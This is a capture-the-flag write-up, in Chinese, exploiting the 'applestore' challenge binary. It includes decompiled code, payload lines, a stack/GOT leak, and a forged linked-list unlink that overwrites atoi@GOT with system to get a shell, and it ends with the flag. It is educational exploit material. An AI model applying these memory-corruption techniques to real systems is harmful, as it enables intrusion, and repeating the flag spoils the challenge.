# applestore

```
user@vm-ubuntu20:~/tw$ checksec applestore
[*] '/home/user/tw/applestore'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

obj
- +0 *name
- +4 price
- +8 *fd 指向 後一個 +0
- +12 *bk 指向 前一個 +0

最一開始的 mycart 是在 bss ,fd 指向第一個物品


如果 checkout 總價等於 7174 會幫你加一個一元的 iphone8，iphone8 在 stack 上，並且會加入到 linklist 上，所以如果可以控制就可以利用 delete unlink 來寫入



計算要買幾台才會剛好 7174，可以用 z3 幫忙算，有多種買法，我只列一個

```
1: iPhone 6 - $199  16
2: iPhone 6 Plus - $299  0
3: iPad Air 2 - $499  0
4: iPad Mini 3 - $399  10
5: iPod Touch - $199  0
```

cart 的 buf 位置為 ebp-22h ， checkout 的 iphone8 v2 結構存放位置為 ebp-20h

這邊的 cart checkout handler 等多個函數 ebp 都是相同的

差兩個 bytes ，cart my_read 只會確認第一個字是否為 y ，所以可以構造 y\x00 這樣 cart 就可以蓋到 ebp-20h

所以可以寫入 `bss_cart= 0x804B070
payload = b'y\x00'+p32(elf.got['puts'])+p32(1)+p32(bss_cart)+p32(1)`

這樣在 cart 循環時就會在 28 拿到原本的 bss_cart 從 +4 開始直到 \x00 ，這樣就可以 leak heap 頭的位置


不過這邊用不太到 heap addr

可以觀察 leak 出的 chunks 跟實際上的多0x490


還可以再洩漏 stack 位置，利用 heap_adrr+0x??? 去洩露 存在 heap 上的 stack 位置
，第 27 節點 stack 

或是利用 `environ_libc = libc_addr + libc.symbols['environ']` 拿到 stack 位置


利用 delete 以及 Partial RELRO，可以劫持 got 把 atoi 換成 system

但是 unlink 前提是 fd 和 bk 所在的區域都具有可寫權限

delete 的 buf 位置為 ebp-22h


environ 0xffbf4fdc
delete ebp 0xffbf4ed8
offset 0xffbf4fdc - 0xffbf4ed8 - 0x8 = 0x10c



```
payload = b'27' + p32(stack_addr) + p32(1) + p32(atoi_got + 0x22) + p32(stack_addr - 0x10c)
                   name             price       fd                               bk

offset = 0xffbf4fdc - 0xffbf4ed8 - 0x8 = 0x10c

stack_addr - offset - 0x8 = delete_ebp_addr

        *(_DWORD *)(bk + 8) = fd;
           handler ebp = atoi_got + 0x22
        *(_DWORD *)(fd + 12) = bk;
            got 寫入 不重要
            
```

再 handler 再次寫入 ebp-22 時，就等同於寫入 got 位置，之後再放上 /bin/sh 

就可以拿到 shell

```c  
int cart()
{
  signed int v0; // eax
  signed int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  _DWORD *i; // [esp+20h] [ebp-28h]
  char buf; // [esp+26h] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&buf, 0x15u);
  if ( buf == 'y' )
  {
    puts("==== Cart ====");
    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *i, i[1]);
      v3 += i[1];
    }
  }
  return v3;
}
struct_v3 *__cdecl insert(struct_v3 *a1)
{
  struct_v3 *result; // eax
  struct_v3 *i; // [esp+Ch] [ebp-4h]

  for ( i = (struct_v3 *)&myCart; i->bk; i = (struct_v3 *)i->bk )
    ;
  i->bk = a1;
  result = a1;
  a1[1].field_0 = (char *)i;
  return result;
}

unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2; // [esp+18h] [ebp-20h]
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2, "%s", "iPhone 8");
    v3 = 1;
    insert((int)&v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v4;
}

unsigned int delete()
{
  signed int v1; // [esp+10h] [ebp-38h]
  _DWORD *v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int fd; // [esp+1Ch] [ebp-2Ch]
  int bk; // [esp+20h] [ebp-28h]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = (_DWORD *)dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  v3 = atoi(&nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      fd = v2[2];
      bk = v2[3];
      if ( bk )
        *(_DWORD *)(bk + 8) = fd;
      if ( fd )
        *(_DWORD *)(fd + 12) = bk;
      printf("Remove %d:%s from your shopping cart.\n", v1, *v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = (_DWORD *)v2[2];
  }
  return __readgsdword(0x14u) ^ v7;
}
```

>FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
